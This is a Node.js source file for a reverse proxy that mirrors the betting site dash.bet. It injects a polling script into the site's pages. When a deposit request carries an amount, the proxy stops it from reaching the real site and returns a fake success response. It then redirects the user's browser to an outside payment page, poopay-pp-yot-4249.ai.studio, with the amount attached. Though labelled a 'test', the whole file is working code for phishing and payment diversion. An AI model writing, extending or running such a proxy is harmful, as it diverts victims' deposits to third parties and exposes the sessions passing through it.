import http from "node:http";
import https from "node:https";
import crypto from "node:crypto";

const PROXY_HOST = "127.0.0.1";
const PROXY_PORT = 5001;

const TARGET = {
  hostname: "dash.bet",
  port: 443
};

const REDIRECT_API_PATH = "/api/v2/transactions/deposit";
const REDIRECT_BASE_URL = "https://poopay-pp-yot-4249.ai.studio";

const REDIRECT_TTL_MS = 30_000;

// Per-browser proxy state
const clients = new Map();

/*
 * ==========================================
 * CLIENT ID
 * ==========================================
 */

function createClientId() {
  return crypto.randomUUID();
}

function getClientId(req) {
  const cookieHeader = req.headers.cookie || "";

  const match = cookieHeader.match(
    /(?:^|;\s*)proxy_client_id=([^;]+)/
  );

  return match ? match[1] : null;
}

function getOrCreateClient(req, res) {
  let id = getClientId(req);

  if (!id) {
    id = createClientId();

    res.setHeader(
      "Set-Cookie",
      `proxy_client_id=${id}; Path=/; HttpOnly; SameSite=Lax`
    );
  }

  if (!clients.has(id)) {
    clients.set(id, {
      redirected: false,
      redirectUrl: null,
      createdAt: Date.now()
    });
  }

  return id;
}

/*
 * ==========================================
 * CLEAN OLD CLIENT STATES
 * ==========================================
 */

setInterval(() => {
  const now = Date.now();

  for (const [id, state] of clients.entries()) {
    if (
      now - state.createdAt >
      REDIRECT_TTL_MS
    ) {
      clients.delete(id);
    }
  }
}, 10_000);

/*
 * ==========================================
 * REDACT SENSITIVE JSON FIELDS
 * ==========================================
 */

function redactSensitiveData(value) {
  if (!value || typeof value !== "object") {
    return value;
  }

  if (Array.isArray(value)) {
    return value.map(redactSensitiveData);
  }

  const result = {};

  for (const [key, val] of Object.entries(value)) {
    const lower = key.toLowerCase();

    if (
      lower.includes("password") ||
      lower.includes("passwd") ||
      lower.includes("token") ||
      lower.includes("secret") ||
      lower.includes("authorization") ||
      lower.includes("access_token") ||
      lower.includes("refresh_token") ||
      lower.includes("session")
    ) {
      result[key] = "[REDACTED]";
    } else if (
      val &&
      typeof val === "object"
    ) {
      result[key] = redactSensitiveData(val);
    } else {
      result[key] = val;
    }
  }

  return result;
}

/*
 * ==========================================
 * INJECT REDIRECT WATCHER INTO HTML
 * ==========================================
 */

function injectWatcher(html) {
  const script = `
<script>
(function () {

  async function checkProxyRedirect() {

    try {
      const response = await fetch(
        "/__proxy_redirect_status",
        {
          method: "GET",
          cache: "no-store",
          credentials: "same-origin"
        }
      );

      if (!response.ok) {
        return;
      }

      const data = await response.json();

      if (
        data.redirect === true &&
        data.url
      ) {
        window.location.replace(data.url);
      }

    } catch (error) {
      // Ignore temporary proxy errors.
    }
  }

  setInterval(checkProxyRedirect, 500);

  checkProxyRedirect();

})();
</script>
`;

  if (html.includes("</body>")) {
    return html.replace(
      "</body>",
      `${script}</body>`
    );
  }

  return html + script;
}

/*
 * ==========================================
 * MAIN SERVER
 * ==========================================
 */

const server = http.createServer(
  (clientReq, clientRes) => {

    const parsedUrl = new URL(
      clientReq.url,
      `http://${clientReq.headers.host || "localhost"}`
    );

    const path = parsedUrl.pathname;

    const clientId = getOrCreateClient(
      clientReq,
      clientRes
    );

    const state = clients.get(clientId);

    console.log(
      `→ ${clientReq.method} ${clientReq.url}`
    );

    /*
     * ==========================================
     * REDIRECT STATUS ENDPOINT
     * ==========================================
     */

    if (
      clientReq.method === "GET" &&
      path === "/__proxy_redirect_status"
    ) {
      const shouldRedirect =
        state?.redirected === true;

      const response = JSON.stringify({
        redirect: Boolean(shouldRedirect),
        url: state?.redirectUrl || null
      });

      clientRes.writeHead(200, {
        "Content-Type":
          "application/json; charset=utf-8",
        "Cache-Control":
          "no-store",
        "Content-Length":
          Buffer.byteLength(response)
      });

      clientRes.end(response);

      return;
    }

    /*
     * ==========================================
     * REDIRECT TRIGGER ENDPOINT
     * ==========================================
     */

    if (path === REDIRECT_API_PATH) {

      const chunks = [];

      clientReq.on("data", chunk => {
        chunks.push(chunk);
      });

      clientReq.on("end", () => {

        const body = Buffer.concat(chunks);

        /*
         * --------------------------------------
         * NO BODY
         * --------------------------------------
         */

        if (body.length === 0) {

          console.log(
            `↪ ${REDIRECT_API_PATH} has no body`
          );

          console.log(
            "↪ Continuing normal proxying..."
          );

          forwardRequest(
            clientReq,
            clientRes,
            body
          );

          return;
        }

        /*
         * --------------------------------------
         * BODY EXISTS
         * --------------------------------------
         */

        console.log("");
        console.log(
          "========================================"
        );

        console.log(
          "🚨 REDIRECT TRIGGER"
        );

        console.log(
          `Endpoint: ${REDIRECT_API_PATH}`
        );

        console.log(
          `Body size: ${body.length} bytes`
        );

        try {

          const json = JSON.parse(
            body.toString("utf8")
          );

          /*
           * Show the body safely in terminal.
           */
          console.log(
            "\nRequest body:"
          );

          console.log(
            JSON.stringify(
              redactSensitiveData(json),
              null,
              2
            )
          );

          /*
           * --------------------------------------
           * EXTRACT amount
           * --------------------------------------
           */

          const amount = json.amount;

          /*
           * If no amount exists, don't redirect.
           */
          if (
            amount === undefined ||
            amount === null ||
            String(amount).trim() === ""
          ) {

            console.log(
              "\n⚠️ No amount field found."
            );

            console.log(
              "↪ Continuing normal proxying..."
            );

            console.log(
              "========================================"
            );

            console.log("");

            forwardRequest(
              clientReq,
              clientRes,
              body
            );

            return;
          }

          /*
           * --------------------------------------
           * BUILD REDIRECT URL
           * --------------------------------------
           */

          const redirectUrl =
            new URL(REDIRECT_BASE_URL);

          redirectUrl.searchParams.set(
            "amount",
            String(amount)
          );

          const finalUrl =
            redirectUrl.toString();

          console.log(
            `\n📱 amount: ${amount}`
          );

          console.log(
            `➡ Redirect URL: ${finalUrl}`
          );

          /*
           * --------------------------------------
           * MARK BROWSER SESSION
           * --------------------------------------
           */

          if (state) {
            state.redirected = true;
            state.redirectUrl = finalUrl;
            state.createdAt = Date.now();
          }

          /*
           * --------------------------------------
           * DO NOT FORWARD THIS API
           * --------------------------------------
           *
           * The proxy stops forwarding this
           * request once a body containing amount
           * is detected.
           */

          const response = JSON.stringify({
            success: true,
            proxyRedirect: true
          });

          clientRes.writeHead(200, {
            "Content-Type":
              "application/json; charset=utf-8",
            "Cache-Control":
              "no-store",
            "Content-Length":
              Buffer.byteLength(response)
          });

          clientRes.end(response);

          console.log(
            "🛑 Proxy stopped for this browser."
          );

          console.log(
            "========================================"
          );

          console.log("");

        } catch (error) {

          /*
           * Invalid JSON:
           * continue normal proxying.
           */

          console.log(
            "\n⚠️ Invalid JSON:"
          );

          console.log(
            error.message
          );

          console.log(
            "↪ Continuing normal proxying..."
          );

          console.log(
            "========================================"
          );

          console.log("");

          forwardRequest(
            clientReq,
            clientRes,
            body
          );
        }
      });

      return;
    }

    /*
     * ==========================================
     * STOP PROXYING AFTER REDIRECT
     * ==========================================
     */

    if (
      state &&
      state.redirected === true
    ) {

      console.log(
        `🛑 Request blocked after redirect: ${path}`
      );

      clientRes.writeHead(410, {
        "Content-Type":
          "text/plain; charset=utf-8",
        "Cache-Control":
          "no-store"
      });

      clientRes.end(
        "Proxy session terminated"
      );

      return;
    }

    /*
     * ==========================================
     * NORMAL PROXY
     * ==========================================
     */

    forwardRequest(
      clientReq,
      clientRes,
      null
    );
  }
);

/*
 * ==========================================
 * FORWARD REQUEST
 * ==========================================
 */

function forwardRequest(
  clientReq,
  clientRes,
  bufferedBody = null
) {

  const upstreamHeaders = {
    ...clientReq.headers,

    host: TARGET.hostname,

    // Easier HTML/JSON inspection
    "accept-encoding": "identity"
  };

  delete upstreamHeaders.connection;

  /*
   * If we buffered a body, update its length.
   */
  if (Buffer.isBuffer(bufferedBody)) {
    upstreamHeaders["content-length"] =
      bufferedBody.length;
  }

  const options = {
    hostname: TARGET.hostname,
    port: TARGET.port,
    method: clientReq.method,
    path: clientReq.url,
    headers: upstreamHeaders,
    rejectUnauthorized: true
  };

  const upstreamReq = https.request(
    options,
    upstreamRes => {

      console.log(
        `← ${upstreamRes.statusCode} ${clientReq.method} ${new URL(
          clientReq.url,
          `http://${clientReq.headers.host || "localhost"}`
        ).pathname}`
      );

      const contentType =
        upstreamRes.headers[
          "content-type"
        ] || "";

      /*
       * ========================================
       * HTML RESPONSE
       * ========================================
       */

      if (
        contentType.includes("text/html")
      ) {

        const chunks = [];

        upstreamRes.on(
          "data",
          chunk => {
            chunks.push(chunk);
          }
        );

        upstreamRes.on(
          "end",
          () => {

            let body =
              Buffer.concat(chunks);

            let html =
              body.toString("utf8");

            /*
             * Inject watcher.
             */
            html =
              injectWatcher(html);

            body =
              Buffer.from(
                html,
                "utf8"
              );

            const headers = {
              ...upstreamRes.headers
            };

            delete headers[
              "content-length"
            ];

            delete headers[
              "content-encoding"
            ];

            headers[
              "content-length"
            ] = body.length;

            clientRes.writeHead(
              upstreamRes.statusCode,
              headers
            );

            clientRes.end(body);
          }
        );

        return;
      }

      /*
       * ========================================
       * NORMAL RESPONSE
       * ========================================
       */

      clientRes.writeHead(
        upstreamRes.statusCode,
        upstreamRes.headers
      );

      upstreamRes.pipe(clientRes);
    }
  );

  /*
   * ==========================================
   * UPSTREAM ERROR
   * ==========================================
   */

  upstreamReq.on(
    "error",
    error => {

      console.error(
        "Upstream error:",
        error.message
      );

      if (
        !clientRes.headersSent
      ) {

        clientRes.writeHead(
          502,
          {
            "Content-Type":
              "text/plain; charset=utf-8"
          }
        );
      }

      clientRes.end(
        `Bad Gateway: ${error.message}`
      );
    }
  );

  /*
   * ==========================================
   * FORWARD BODY
   * ==========================================
   */

  if (
    Buffer.isBuffer(bufferedBody)
  ) {

    upstreamReq.end(
      bufferedBody
    );

    return;
  }

  /*
   * Stream regular requests.
   */
  clientReq.pipe(upstreamReq);
}

/*
 * ==========================================
 * CLIENT ERRORS
 * ==========================================
 */

server.on(
  "clientError",
  (error, socket) => {

    console.error(
      "Client error:",
      error.message
    );

    socket.end(
      "HTTP/1.1 400 Bad Request\r\n\r\n"
    );
  }
);

/*
 * ==========================================
 * START
 * ==========================================
 */

server.listen(
  PROXY_PORT,
  PROXY_HOST,
  () => {

    console.log("");
    console.log(
      "=========================================="
    );

    console.log(
      " Redirect Test Proxy"
    );

    console.log(
      "=========================================="
    );

    console.log(
      `Local:     http://${PROXY_HOST}:${PROXY_PORT}`
    );

    console.log(
      `Upstream:  https://${TARGET.hostname}`
    );

    console.log(
      `Trigger:   ${REDIRECT_API_PATH}`
    );

    console.log(
      `Redirect:  ${REDIRECT_BASE_URL}?amount=...`
    );

    console.log(
      "=========================================="
    );

    console.log("");
  }
);